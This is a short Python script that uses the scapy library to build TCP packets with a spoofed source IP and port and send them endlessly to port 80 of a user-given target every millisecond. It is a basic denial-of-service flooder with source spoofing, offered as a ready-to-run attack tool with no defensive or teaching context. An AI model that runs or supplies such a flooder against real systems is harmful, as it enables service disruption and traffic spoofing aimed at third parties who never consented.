#!/usr/bin/python3

from scapy.all import *

src = input("Enter the spoofed source IP: ")
srcport = int(input("Enter the spoofed source port: "))

target = input("Enter the target IP: ")

i=1

while True: 
  IP1 = IP(src=src, dst=target) # Sets source and destination IP
  TCP1 = TCP(sport=srcport, dport=80) # Sets spoofed source port
  pkt = IP1 / TCP1 # Creation of actual TCP packet
  send(pkt,inter= .001) # Send packet every .001 second
  print("packet sent ", i)
  i=i+1
